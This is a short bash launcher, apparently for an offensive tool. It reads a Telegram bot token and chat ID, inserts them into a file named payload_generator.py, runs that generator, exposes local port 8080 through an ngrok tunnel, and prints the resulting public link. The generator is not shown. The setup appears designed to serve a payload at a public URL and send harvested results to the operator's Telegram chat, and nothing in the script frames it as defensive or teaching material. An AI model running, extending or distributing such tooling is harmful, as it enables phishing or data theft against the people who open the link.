#!/bin/bash
echo "Enter Bot Token:"
read BOT_TOKEN
echo "Enter Chat ID:"
read CHAT_ID
sed -i "s/YOUR_BOT_TOKEN/$BOT_TOKEN/g" payload_generator.py
sed -i "s/YOUR_CHAT_ID/$CHAT_ID/g" payload_generator.py
python payload_generator.py &
ngrok http 8080 &
sleep 8
curl -s http://localhost:4040/api/tunnels | python -c "import sys,json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])" > link.txt
cat link.txt
